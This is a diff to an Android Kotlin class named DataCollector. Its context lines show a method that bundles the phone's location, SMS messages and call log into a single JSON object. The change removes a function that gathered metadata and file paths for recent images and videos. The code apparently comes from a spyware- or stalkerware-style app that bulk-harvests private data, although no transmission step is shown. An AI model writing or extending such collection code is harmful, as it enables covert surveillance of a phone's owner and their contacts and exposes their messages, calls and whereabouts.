@@ -6,10 +6,7 @@ import android.content.pm.PackageManager
 import android.database.Cursor
 import android.location.Location
 import android.location.LocationManager
-import android.net.Uri
-import android.os.Build
 import android.provider.CallLog
-import android.provider.MediaStore
 import android.provider.Telephony
 import android.util.Log
 import androidx.core.content.ContextCompat
@@ -158,63 +155,12 @@ class DataCollector(private val ctx: Context) {
         else -> "other"
     }
 
-    // ── Media (Images + Videos) ─────────────────────────────────────────────
-    fun getMedia(limit: Int = 30): JSONArray {
-        val arr = JSONArray()
-        val hasImages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-            hasPermission(Manifest.permission.READ_MEDIA_IMAGES)
-        else hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
-
-        val hasVideos = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-            hasPermission(Manifest.permission.READ_MEDIA_VIDEO)
-        else hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
-
-        if (!hasImages && !hasVideos) return arr
-
-        val uris = mutableListOf<Pair<Uri, String>>()
-        if (hasImages) uris.add(Pair(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image"))
-        if (hasVideos) uris.add(Pair(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video"))
-
-        for ((uri, mediaType) in uris) {
-            try {
-                val projection = arrayOf(
-                    MediaStore.MediaColumns._ID,
-                    MediaStore.MediaColumns.DISPLAY_NAME,
-                    MediaStore.MediaColumns.SIZE,
-                    MediaStore.MediaColumns.DATE_MODIFIED,
-                    MediaStore.MediaColumns.MIME_TYPE,
-                    MediaStore.MediaColumns.DATA
-                )
-                val cursor: Cursor? = ctx.contentResolver.query(
-                    uri, projection, null, null,
-                    "${MediaStore.MediaColumns.DATE_MODIFIED} DESC LIMIT $limit"
-                )
-                cursor?.use {
-                    while (it.moveToNext() && arr.length() < limit) {
-                        val obj = JSONObject()
-                        obj.put("type",     mediaType)
-                        obj.put("name",     it.getString(it.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)) ?: "")
-                        obj.put("size",     it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)))
-                        obj.put("date",     it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)) * 1000L)
-                        obj.put("mime",     it.getString(it.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)) ?: "")
-                        obj.put("path",     it.getString(it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)) ?: "")
-                        arr.put(obj)
-                    }
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "Media ($mediaType) error: ${e.message}")
-            }
-        }
-        return arr
-    }
-
     // ── Bundle all data ─────────────────────────────────────────────────────
     fun collectAll(): JSONObject {
         val bundle = JSONObject()
         bundle.put("location", getLocation())
         bundle.put("sms",      getSms())
         bundle.put("callLog",  getCallLog())
-        bundle.put("media",    getMedia())
         bundle.put("timestamp", System.currentTimeMillis())
         return bundle
     }
